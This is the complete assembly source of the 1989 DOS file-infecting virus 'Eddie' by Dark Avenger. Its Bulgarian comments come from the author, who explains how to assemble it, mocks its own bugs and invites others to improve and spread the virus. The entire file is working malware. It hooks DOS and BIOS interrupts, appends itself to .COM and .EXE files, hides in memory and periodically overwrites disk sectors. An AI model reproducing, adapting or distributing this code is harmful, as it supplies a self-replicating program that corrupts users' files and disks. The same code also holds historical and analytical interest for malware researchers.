;************************
;*			*
;*	E D D I E	*
;*			*
;*   by  Dark Avenger	*
;*			*
;*	3-JAN-1989	*
;*			*
;*     version 1.31x	*
;*			*
;************************


; "Blessed is he who expects nothing, for he shall not be disappointed."

;   Пред вас стои оригиналният текст на един от първите български вируси. Както
; може би ще забележите, той е пълен с глупости и грешки, но въпреки това не
; само ще се разпространи учудващо бързо из страната, но и успя за кратко време
; да обиколи света (той е разпространен както в Източна и Западна Европа, така и
; в Америка). Текстът се разпространява напълно свободно по случай 1 година от
; завършването на базовата му версия. Вие имате право да разпространявате
; текста както безплатно, така и срещу заплащане с единственото условие той
; изобщо да не е променян. Който умишлено разпространява променен по някакъв
; начин текст, върши това против желанието на автора и ще бъде наказан! Въпреки
; това, авторът ще се радва ако някой от вас извърши подобрения в текста и
; разпространява получения изпълним файл (т.е. самият вирус). Обърнете
; внимание, че след асемблирането полученият .COM файл не може да бъде
; стартиран. За целта трябва да създадете файл с дължина 3 байта, съдържащ
; шестнадесетичните числа 0E9h, 68h, 0 и след това да обедините двата файла. Не
; се опитвайте да поставите инструкция JMP в началото на текста.

;   ПРЕДУПРЕЖДЕНИЕ: Авторът не поема никаква отговорност за директно или
; индиректно нанесени щети, предизвикани от използването или неизползването на
; този текст или на получения при асемблиране код. Никаква гаранция не се дава
; за функционирането или качеството на продукта.

;   Не мога да не се въздържа да изкажа специалната си благодарност на моя
; популяризатор инж. Веселин Бончев, който ми прави голяма реклама и освен
; това, искайки или не, той съдейства много за разпространяването на моите
; вируси въпреки, че се опитва да прави точно обратното (писането на програми на
; C никого не е довело до добро).
;   Поздрави на всички вирусописачи!


code	segment
	assume	cs:code,ds:code
copyright:
	db	'Eddie lives...somewhere in time!',0
date_stamp:
	dd	12239000h
checksum:
	db	30

; Връщане на управлението на .EXE файл:
; Възстановява DS=ES=PSP, зарежда SS:SP и CS:IP.

exit_exe:
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+call_adr+2]
	mov	word ptr cs:[si+patch+2],bx
	mov	bx,word ptr cs:[si+call_adr]
	mov	word ptr cs:[si+patch],bx
	mov	bx,es
	add	bx,10h
	add	bx,word ptr cs:[si+stack_pointer+2]
	mov	ss,bx
	mov	sp,word ptr cs:[si+stack_pointer]
	db	0eah			;JMP XXXX:YYYY
patch:
	dd	0

; Връщане на управлението на .COM файл:
; Възстановява 3-те байта в началото на файла, зарежда SP и IP.

exit_com:
	mov	di,100h
	add	si,offset my_save
	movsb
	movsw
	mov	sp,ds:[6]		;Това е неправилно
	xor	bx,bx
	push	bx
	jmp	[si-11] 		;si+call_adr-top_file

; Входна точка на програмата.

startup:
	call	relative
relative:
	pop	si			;SI = $
	sub	si,offset relative
	cld
	cmp	word ptr cs:[si+my_save],5a4dh
	je	exe_ok
	cli
	mov	sp,si			;За .COM файловете се поддържа отделен
	add	sp,offset top_file+100h ;стек, за да не се премести програмата
	sti				;върху стека
	cmp	sp,ds:[6]
	jnc	exit_com
exe_ok:
	push	ax
	push	es
	push	si
	push	ds
	mov	di,si

; Намиране на адреса на INT 13h в ROM-BIOS

	xor	ax,ax
	push	ax
	mov	ds,ax
	les	ax,ds:[13h*4]
	mov	word ptr cs:[si+fdisk],ax
	mov	word ptr cs:[si+fdisk+2],es
	mov	word ptr cs:[si+disk],ax
	mov	word ptr cs:[si+disk+2],es
	mov	ax,ds:[40h*4+2] 	;В INT 40h се запазва адреса на INT 13h
	cmp	ax,0f000h		;за дискети при наличие на твърд диск
	jne	nofdisk
	mov	word ptr cs:[si+disk+2],ax
	mov	ax,ds:[40h*4]
	mov	word ptr cs:[si+disk],ax
	mov	dl,80h
	mov	ax,ds:[41h*4+2] 	;INT 41h обикновено сочи в сегмента,
	cmp	ax,0f000h		;където е оригиналния INT 13h вектор
	je	isfdisk
	cmp	ah,0c8h
	jc	nofdisk
	cmp	ah,0f4h
	jnc	nofdisk
	test	al,7fh
	jnz	nofdisk
	mov	ds,ax
	cmp	ds:[0],0aa55h
	jne	nofdisk
	mov	dl,ds:[2]
isfdisk:
	mov	ds,ax
	xor	dh,dh
	mov	cl,9
	shl	dx,cl
	mov	cx,dx
	xor	si,si
findvect:
	lodsw				;Обикновено започва с:
	cmp	ax,0fa80h		;	CMP	DL,80h
	jne	altchk			;	JNC	някъде
	lodsw
	cmp	ax,7380h
	je	intchk
	jne	nxt0
altchk:
	cmp	ax,0c2f6h		;или с:
	jne	nxt			;	TEST	DL,80h
	lodsw				;	JNZ	някъде
	cmp	ax,7580h
	jne	nxt0
intchk:
	inc	si			;след което има:
	lodsw				;	INT	40h
	cmp	ax,40cdh
	je	found
	sub	si,3
nxt0:
	dec	si
	dec	si
nxt:
	dec	si
	loop	findvect
	jmp	short nofdisk
found:
	sub	si,7
	mov	word ptr cs:[di+fdisk],si
	mov	word ptr cs:[di+fdisk+2],ds
nofdisk:
	mov	si,di
	pop	ds

; Проверка дали програмата е резидентна

	les	ax,ds:[21h*4]
	mov	word ptr cs:[si+save_int_21],ax
	mov	word ptr cs:[si+save_int_21+2],es
	push	cs
	pop	ds
	cmp	ax,offset int_21
	jne	bad_func
	xor	di,di
	mov	cx,offset my_size
scan_func:
	lodsb
	scasb
	jne	bad_func
	loop	scan_func
	pop	es
	jmp	go_program

; Преместване на програмата в горния край на паметта
; (тук е пълно с глупости и грешки)

bad_func:
	pop	es
	mov	ah,49h
	int	21h
	mov	bx,0ffffh
	mov	ah,48h
	int	21h
	sub	bx,(top_bz+my_bz+1ch-1)/16+2
	jc	go_program
	mov	cx,es
	stc
	adc	cx,bx
	mov	ah,4ah
	int	21h
	mov	bx,(offset top_bz+offset my_bz+1ch-1)/16+1
	stc
	sbb	es:[2],bx
	push	es
	mov	es,cx
	mov	ah,4ah
	int	21h
	mov	ax,es
	dec	ax
	mov	ds,ax
	mov	word ptr ds:[1],8
	call	mul_16
	mov	bx,ax
	mov	cx,dx
	pop	ds
	mov	ax,ds
	call	mul_16
	add	ax,ds:[6]
	adc	dx,0
	sub	ax,bx
	sbb	dx,cx
	jc	mem_ok
	sub	ds:[6],ax		;Намаляване на големината на сегмента
mem_ok:
	pop	si
	push	si
	push	ds
	push	cs
	xor	di,di
	mov	ds,di
	lds	ax,ds:[27h*4]
	mov	word ptr cs:[si+save_int_27],ax
	mov	word ptr cs:[si+save_int_27+2],ds
	pop	ds
	mov	cx,offset aux_size
	rep	movsb
	xor	ax,ax
	mov	ds,ax
	mov	ds:[21h*4],offset int_21;Прехващане на INT 21h и INT 27h
	mov	ds:[21h*4+2],es
	mov	ds:[27h*4],offset int_27
	mov	ds:[27h*4+2],es
	mov	word ptr es:[filehndl],ax
	pop	es
go_program:
	pop	si

; Замазване на следващия сектор от диска

	xor	ax,ax
	mov	ds,ax
	mov	ax,ds:[13h*4]
	mov	word ptr cs:[si+save_int_13],ax
	mov	ax,ds:[13h*4+2]
	mov	word ptr cs:[si+save_int_13+2],ax
	mov	ds:[13h*4],offset int_13
	add	ds:[13h*4],si
	mov	ds:[13h*4+2],cs
	pop	ds
	push	ds
	push	si
	mov	bx,si
	lds	ax,ds:[2ah]
	xor	si,si
	mov	dx,si
scan_envir:				;Намира името на програмата
	lodsw				;(със DOS 2.x и без друго не работи)
	dec	si
	test	ax,ax
	jnz	scan_envir
	add	si,3
	lodsb

; Следващата инструкция е пълна глупост.  Опитайте да си напишете path-а с
; малки букви, след това пуснете заразена програма от там.  В резултат
; на грешката тук + грешка в DOS следващият сектор не се замазва, но се
; замазват два байта в паметта, най-вероятно върху заразената програма.

	sub	al,'A'
	mov	cx,1
	push	cs
	pop	ds
	add	bx,offset int_27
	push	ax
	push	bx
	push	cx
	int	25h
	pop	ax
	pop	cx
	pop	bx
	inc	byte ptr [bx+0ah]
	and	byte ptr [bx+0ah],0fh	;Изглежда 15 пъти неправене нищо е много
	jnz	store_sec		;малко за някои хора
	mov	al,[bx+10h]
	xor	ah,ah
	mul	word ptr [bx+16h]
	add	ax,[bx+0eh]
	push	ax
	mov	ax,[bx+11h]
	mov	dx,32
	mul	dx
	div	word ptr [bx+0bh]
	pop	dx
	add	dx,ax
	mov	ax,[bx+8]
	add	ax,40h
	cmp	ax,[bx+13h]
	jc	store_new
	inc	ax
	and	ax,3fh
	add	ax,dx
	cmp	ax,[bx+13h]
	jnc	small_disk
store_new:
	mov	[bx+8],ax
store_sec:
	pop	ax
	xor	dx,dx
	push	ax
	push	bx
	push	cx
	int	26h

; Записът през това прекъсване не е най-умното нещо, защото то може да бъде
; прехванато (както е успял да забележи Веселин Бончев)

	pop	ax
	pop	cx
	pop	bx
	pop	ax
	cmp	byte ptr [bx+0ah],0
	jne	not_now
	mov	dx,[bx+8]
	pop	bx
	push	bx
	int	26h
small_disk:
	pop	ax
not_now:
	pop	si
	xor	ax,ax
	mov	ds,ax
	mov	ax,word ptr cs:[si+save_int_13]
	mov	ds:[13h*4],ax
	mov	ax,word ptr cs:[si+save_int_13+2]
	mov	ds:[13h*4+2],ax
	pop	ds
	pop	ax
	cmp	word ptr cs:[si+my_save],5a4dh
	jne	go_exit_com
	jmp	exit_exe
go_exit_com:
	jmp	exit_com
int_24:
	mov	al,3			;Тази инструкция изглежда излишна
	iret

; Обработка на INT 27h (това е необходимо)

int_27:
	pushf
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_27]

; При DOS-функциите Set & Get Vector се работи като че ли програмата не ги е
; прехванала (това е съмнително предимство и е един възможен източник на
; недоразумения с някои "интелигентни" програми)

set_int_27:
	mov	word ptr cs:[save_int_27],dx
	mov	word ptr cs:[save_int_27+2],ds
	popf
	iret
set_int_21:
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	popf
	iret
get_int_27:
	les	bx,dword ptr cs:[save_int_27]
	popf
	iret
get_int_21:
	les	bx,dword ptr cs:[save_int_21]
	popf
	iret

exec:
	call	do_file
	call	alloc
	popf
	jmp	dword ptr cs:[save_int_21]

	db	'Diana P.',0

; Обработка на INT 21h.  Осъществява заразяването на файловете
; при изпълнение, копиране, разглеждане или създаване и някои други операции.
; Изпълнението на функции 0 и 26h предизвиква лоши последици.

int_21:
	push	bp
	mov	bp,sp
	push	[bp+6]
	popf
	pop	bp
	pushf
	call	ontop
	cmp	ax,2521h
	je	set_int_21
	cmp	ax,2527h
	je	set_int_27
	cmp	ax,3521h
	je	get_int_21
	cmp	ax,3527h
	je	get_int_27
	cld
	cmp	ax,4b00h
	je	exec
	cmp	ah,3ch
	je	create
	cmp	ah,3eh
	je	close
	cmp	ah,5bh
	jne	not_create
create:
	cmp	word ptr cs:[filehndl],0;Може и да е 0 при отворен файл
	jne	dont_touch
	call	see_name
	jnz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	es
	push	cs
	pop	es
	push	si
	push	di
	push	cx
	push	ax
	mov	di,offset filehndl
	stosw
	mov	si,dx
	mov	cx,65
move_name:
	lodsb
	stosb
	test	al,al
	jz	all_ok
	loop	move_name
	mov	word ptr es:[filehndl],cx
all_ok:
	pop	ax
	pop	cx
	pop	di
	pop	si
	pop	es
go_exit:
	popf
	jnc	int_exit		;JMP
close:
	cmp	bx,word ptr cs:[filehndl]
	jne	dont_touch
	test	bx,bx
	jz	dont_touch
	call	alloc
	popf
	call	function
	jc	int_exit
	pushf
	push	ds
	push	cs
	pop	ds
	push	dx
	mov	dx,offset filehndl+2
	call	do_file
	mov	word ptr cs:[filehndl],0
	pop	dx
	pop	ds
	jmp	go_exit
not_create:
	cmp	ah,3dh
	je	touch
	cmp	ah,43h
	je	touch
	cmp	ah,56h			;За съжаление командния интерпретатор
	jne	dont_touch		;не използува тази функция
touch:
	call	see_name
	jnz	dont_touch
	call	do_file
dont_touch:
	call	alloc
	popf
	call	function
int_exit:
	pushf
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'Z'
	pop	ds
	popf
dummy	proc	far			;???
	ret	2
dummy	endp

; Проверява дали файлът е .COM или .EXE.  Не се извиква при изпълнение на файл.

see_name:
	push	ax
	push	si
	mov	si,dx
scan_name:
	lodsb
	test	al,al
	jz	bad_name
	cmp	al,'.'
	jnz	scan_name
	call	get_byte
	mov	ah,al
	call	get_byte
	cmp	ax,'co'
	jz	pos_com
	cmp	ax,'ex'
	jnz	good_name
	call	get_byte
	cmp	al,'e'
	jmp	short good_name
pos_com:
	call	get_byte
	cmp	al,'m'
	jmp	short good_name
bad_name:
	inc	al
good_name:
	pop	si
	pop	ax
	ret

; Преобразува в lowercase (подпрограмите са велико нещо).

get_byte:
	lodsb
	cmp	al,'C'
	jc	byte_got
	cmp	al,'Y'
	jnc	byte_got
	add	al,20h
byte_got:
	ret

; Извиква оригиналния INT 21h (за да не се зацикли).

function:
	pushf
	call	dword ptr cs:[save_int_21]
	ret

; Урежда въпроса на изпълним файл.

do_file:
	push	ds			;Запазва регистрите в стека
	push	es
	push	si
	push	di
	push	ax
	push	bx
	push	cx
	push	dx
	mov	si,ds
	xor	ax,ax
	mov	ds,ax
	les	ax,ds:[24h*4]		;Запазва INT 13h и INT 24h в стека
	push	es			;и ги подменя с които трябва
	push	ax
	mov	ds:[24h*4],offset int_24
	mov	ds:[24h*4+2],cs
	les	ax,ds:[13h*4]
	mov	word ptr cs:[save_int_13],ax
	mov	word ptr cs:[save_int_13+2],es
	mov	ds:[13h*4],offset int_13
	mov	ds:[13h*4+2],cs
	push	es
	push	ax
	mov	ds,si
	xor	cx,cx			;Урежда въпроса на Read-only файловете
	mov	ax,4300h
	call	function
	mov	bx,cx
	and	cl,0feh
	cmp	cl,bl
	je	dont_change
	mov	ax,4301h
	call	function
	stc
dont_change:
	pushf
	push	ds
	push	dx
	push	bx
	mov	ax,3d02h		;Сега вече можем на спокойствие да
	call	function		;отворим файла
	jc	cant_open
	mov	bx,ax
	call	disease
	mov	ah,3eh			;Затваряне
	call	function
cant_open:
	pop	cx
	pop	dx
	pop	ds
	popf
	jnc	no_update
	mov	ax,4301h		;Възстановяване на атрибутите на файла,
	call	function		;ако са били променени (за всеки случай)
no_update:
	xor	ax,ax			;Възстановяване на INT 13h и INT 24h
	mov	ds,ax
	pop	ds:[13h*4]
	pop	ds:[13h*4+2]
	pop	ds:[24h*4]
	pop	ds:[24h*4+2]
	pop	dx			;Възстановяване на регистрите
	pop	cx
	pop	bx
	pop	ax
	pop	di
	pop	si
	pop	es
	pop	ds
	ret

; Тази подпрограма върши черната работа.

disease:
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	dx,offset top_save	;Прочитане на началото на файла
	mov	cx,18h
	mov	ah,3fh
	int	21h
	xor	cx,cx
	xor	dx,dx
	mov	ax,4202h		;Запазване на дължината на файла
	int	21h
	mov	word ptr [top_save+1ah],dx
	cmp	ax,offset my_size	;Би трябвало да бъде top_file
	sbb	dx,0
	jc	stop_fuck_2		;Малки файлове не се заразяват
	mov	word ptr [top_save+18h],ax
	cmp	word ptr [top_save],5a4dh
	jne	com_file
	mov	ax,word ptr [top_save+8]
	add	ax,word ptr [top_save+16h]
	call	mul_16
	add	ax,word ptr [top_save+14h]
	adc	dx,0
	mov	cx,dx
	mov	dx,ax
	jmp	short see_sick
com_file:
	cmp	byte ptr [top_save],0e9h
	jne	see_fuck
	mov	dx,word ptr [top_save+1]
	add	dx,103h
	jc	see_fuck
	dec	dh
	xor	cx,cx

; Пълна проверка дали за файла е залепен който трябва

see_sick:
	sub	dx,startup-copyright
	sbb	cx,0
	mov	ax,4200h
	int	21h
	add	ax,offset top_file
	adc	dx,0
	cmp	ax,word ptr [top_save+18h]
	jne	see_fuck
	cmp	dx,word ptr [top_save+1ah]
	jne	see_fuck
	mov	dx,offset top_save+1ch
	mov	si,dx
	mov	cx,offset my_size
	mov	ah,3fh
	int	21h
	jc	see_fuck
	cmp	cx,ax
	jne	see_fuck
	xor	di,di
next_byte:
	lodsb
	scasb
	jne	see_fuck
	loop	next_byte
stop_fuck_2:
	ret
see_fuck:
	xor	cx,cx			;Позициониране в края на файла
	xor	dx,dx
	mov	ax,4202h
	int	21h
	cmp	word ptr [top_save],5a4dh
	je	fuck_exe
	add	ax,offset aux_size+200h ;Да не стане .COM файла много голям
	adc	dx,0
	je	fuck_it
	ret

; Изравнява на граница на параграф за .EXE файловете.  Това е абсолютно ненужно.

fuck_exe:
	mov	dx,word ptr [top_save+18h]
	neg	dl
	and	dx,0fh
	xor	cx,cx
	mov	ax,4201h
	int	21h
	mov	word ptr [top_save+18h],ax
	mov	word ptr [top_save+1ah],dx
fuck_it:
	mov	ax,5700h		;Запазване на датата на файла
	int	21h
	pushf
	push	cx
	push	dx
	cmp	word ptr [top_save],5a4dh
	je	exe_file		;Много умно, няма що
	mov	ax,100h
	jmp	short set_adr
exe_file:
	mov	ax,word ptr [top_save+14h]
	mov	dx,word ptr [top_save+16h]
set_adr:
	mov	di,offset call_adr
	stosw
	mov	ax,dx
	stosw
	mov	ax,word ptr [top_save+10h]
	stosw
	mov	ax,word ptr [top_save+0eh]
	stosw
	mov	si,offset top_save	;Това дава възможност на разни вредни
	movsb				;програми да възстановят точно
	movsw				;оригиналната дължина на .EXE файла
	xor	dx,dx
	mov	cx,offset top_file
	mov	ah,40h
	int	21h			;Записване на програмата
	jc	go_no_fuck		;(не трасирайте тук)
	xor	cx,ax
	jnz	go_no_fuck
	mov	dx,cx
	mov	ax,4200h
	int	21h
	cmp	word ptr [top_save],5a4dh
	je	do_exe
	mov	byte ptr [top_save],0e9h
	mov	ax,word ptr [top_save+18h]
	add	ax,startup-copyright-3
	mov	word ptr [top_save+1],ax
	mov	cx,3
	jmp	short write_header
go_no_fuck:
	jmp	short no_fuck

; Конструиране на header-а на .EXE файла

do_exe:
	call	mul_hdr
	not	ax
	not	dx
	inc	ax
	jne	calc_offs
	inc	dx
calc_offs:
	add	ax,word ptr [top_save+18h]
	adc	dx,word ptr [top_save+1ah]
	mov	cx,10h
	div	cx
	mov	word ptr [top_save+14h],startup-copyright
	mov	word ptr [top_save+16h],ax
	add	ax,(offset top_file-offset copyright-1)/16+1
	mov	word ptr [top_save+0eh],ax
	mov	word ptr [top_save+10h],100h
	add	word ptr [top_save+18h],offset top_file
	adc	word ptr [top_save+1ah],0
	mov	ax,word ptr [top_save+18h]
	and	ax,1ffh
	mov	word ptr [top_save+2],ax
	pushf
	mov	ax,word ptr [top_save+19h]
	shr	byte ptr [top_save+1bh],1
	rcr	ax,1
	popf
	jz	update_len
	inc	ax
update_len:
	mov	word ptr [top_save+4],ax
	mov	cx,18h
write_header:
	mov	dx,offset top_save
	mov	ah,40h
	int	21h			;Записване на началото на файла
no_fuck:
	pop	dx
	pop	cx
	popf
	jc	stop_fuck
	mov	ax,5701h		;Възстановяване на оригиналната дата
	int	21h
stop_fuck:
	ret

; Използува се от подпрограмите за обработка на INT 21h и INT 27h във връзка
; със скриването на програмата в паметта от хора, които няма нужда да я
; виждат.  Цялата тази система е абсурдна и глупава и е още един източник
; на конфликтни ситуации.

alloc:
	push	ds
	call	get_chain
	mov	byte ptr ds:[0],'M'
	pop	ds

; Осигурява оставането на програмата на върха на веригата процеси,
; прехванали INT 21h (ето още един източник на конфликти).

ontop:
	push	ds
	push	ax
	push	bx
	push	dx
	xor	bx,bx
	mov	ds,bx
	lds	dx,ds:[21h*4]
	cmp	dx,offset int_21
	jne	search_segment
	mov	ax,ds
	mov	bx,cs
	cmp	ax,bx
	je	test_complete

; Претърсва сегмента на натрапника прехванал INT 21h, за да намери къде той
; е запазил старата стойност и да я подмени.  За INT 27h не се прави нищо.

	xor	bx,bx
search_segment:
	mov	ax,[bx]
	cmp	ax,offset int_21
	jne	search_next
	mov	ax,cs
	cmp	ax,[bx+2]
	je	got_him
search_next:
	inc	bx
	jne	search_segment
	je	return_control
got_him:
	mov	ax,word ptr cs:[save_int_21]
	mov	[bx],ax
	mov	ax,word ptr cs:[save_int_21+2]
	mov	[bx+2],ax
	mov	word ptr cs:[save_int_21],dx
	mov	word ptr cs:[save_int_21+2],ds
	xor	bx,bx

; И да не го пази в същия сегмент, това все едно няма да му помогне

return_control:
	mov	ds,bx
	mov	ds:[21h*4],offset int_21
	mov	ds:[21h*4+2],cs
test_complete:
	pop	dx
	pop	bx
	pop	ax
	pop	ds
	ret

; Намиране на сегмента на последния MCB

get_chain:
	push	ax
	push	bx
	mov	ah,62h
	call	function
	mov	ax,cs
	dec	ax
	dec	bx
next_blk:
	mov	ds,bx
	stc
	adc	bx,ds:[3]
	cmp	bx,ax
	jc	next_blk
	pop	bx
	pop	ax
	ret

; Умножение по 16

mul_hdr:
	mov	ax,word ptr [top_save+8]
mul_16:
	mov	dx,10h
	mul	dx
	ret

	db	'This program was written in the city of Sofia '
	db	'(C) 1988-89 Dark Avenger',0

; Обработка на INT 13h.
; Извиква оригиналните вектори в BIOS, ако става дума за запис.

int_13:
	cmp	ah,3
	jnz	subfn_ok
	cmp	dl,80h
	jnc	hdisk
	db	0eah			;JMP XXXX:YYYY
my_size:				;--- Дотук се сравнява с оригинала
disk:
	dd	0
hdisk:
	db	0eah			;JMP XXXX:YYYY
fdisk:
	dd	0
subfn_ok:
	db	0eah			;JMP XXXX:YYYY
save_int_13:
	dd	0
call_adr:
	dd	100h

stack_pointer:
	dd	0			;Оригинална стойност на SS:SP
my_save:
	int	20h			;Оригинално съдържание на първите
	nop				;3 байта от файла
top_file:				;--- Дотук се записва във файловете
filehndl    equ $
filename    equ filehndl+2		;Буфер за име на текущо отворения файл
save_int_27 equ filename+65		;Оригинална стойност на INT 27h
save_int_21 equ save_int_27+4		;Оригинална стойност на INT 21h
aux_size    equ save_int_21+4		;--- Дотук се премества в паметта
top_save    equ save_int_21+4		;Начало на буфера, съдържащ:
					; - Първите 24 байта прочетени от файла
					; - Дължината на файла (4 байта)
					; - Последните байтове от файла
					;   (с дължина my_size)
top_bz	    equ top_save-copyright
my_bz	    equ my_size-copyright
code	ends
	end

